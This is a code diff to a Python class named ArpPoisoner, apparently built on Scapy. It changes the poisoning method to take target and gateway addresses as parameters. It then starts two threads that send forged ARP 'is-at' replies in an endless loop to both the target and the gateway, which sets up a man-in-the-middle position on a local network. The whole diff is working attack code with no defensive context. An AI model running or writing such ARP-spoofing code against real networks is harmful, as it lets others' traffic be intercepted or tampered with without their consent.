@@ -56,25 +56,25 @@ class ArpPoisoner:
             else:
                 time.sleep(5)
 
-    def arp_poison(self):
-        if self.target == ARP().psrc:
+    def arp_poison(self, target_ip, gateway_ip):
+        if target_ip == ARP().psrc:
             target_mac = ARP().hwsrc  # Return MAC address of machine
         else:
             target_mac = self.get_target_mac()  # Get MAC address of target
 
         # Construct ARP packet
-        arp = ARP(psrc=self.gateway, pdst=self.target, hwdst=target_mac, op=2)  # is-at operation
+        arp = ARP(psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, op=2)  # is-at operation
 
         # Indefinitely send packets
         while True:
             send(arp, verbose=0)
-            print(colored("[ARP] Sent packet to {} / {} from {}".format(self.target, target_mac, self.gateway), "light_grey"))
+            print(colored("[ARP] Sent packet to {} / {} from {}".format(target_ip, target_mac, gateway_ip), "light_grey"))
             time.sleep(self.interval)
 
     def start(self):
         # Poison the target's and gateway's ARP cache to establish a MITM attack
-        t1 = threading.Thread(target=lambda: self.arp_poison())
-        t2 = threading.Thread(target=lambda: self.arp_poison())
+        t1 = threading.Thread(target=lambda: self.arp_poison(self.target, self.gateway))
+        t2 = threading.Thread(target=lambda: self.arp_poison(self.gateway, self.target))
 
         # Set as daemon threads to allow main thread to exit
         t1.daemon = True
